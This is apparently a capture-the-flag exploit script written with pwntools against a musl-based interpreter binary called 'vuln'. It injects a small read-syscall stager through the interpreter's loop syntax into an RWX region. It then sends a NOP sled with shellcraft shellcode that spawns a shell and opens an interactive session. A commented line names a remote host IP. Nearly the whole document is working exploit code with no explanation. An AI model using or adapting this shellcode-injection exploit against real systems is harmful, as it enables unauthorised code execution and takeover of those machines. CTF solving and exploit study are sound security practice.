# hxp{Ju5T_1n_C4s3_yOU_th0ght_musl_i5_b3TteR_th4n_glibc}
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vuln'
HOST = '0'
PORT =  1337
#HOST = '46.224.122.168'

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(['./ld-musl-x86_64.so.1', TARGET])
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def bf(pay):
    r.sendlineafter(b'$ ', pay)

r = start()
if args.D:
    #debug(r, [0x15c5,0x15ae,0x159d])
    debug(r, [0x1404])

#pause()

# 0x1b sized string will be stored to RWX region
payload = b''
payload += b'+['
payload += asm('''
               push r13
               pop rsi
               mov dl, 0xff
               xor eax, eax
               xor edi, edi
               syscall
               ''')
payload += b'-]'
payload = payload.ljust(27, b'\xcc')

# repeat to make this func compiled & run
for i in range(5):
    bf(payload)

# send second payload
payload = b''
payload += b'\x90'*0x50 + asm('sub rsp, 0x100')
payload += asm(shellcraft.sh())
payload = payload.ljust(0x7f, b'a')
r.sendline(payload)

r.interactive()
r.close()

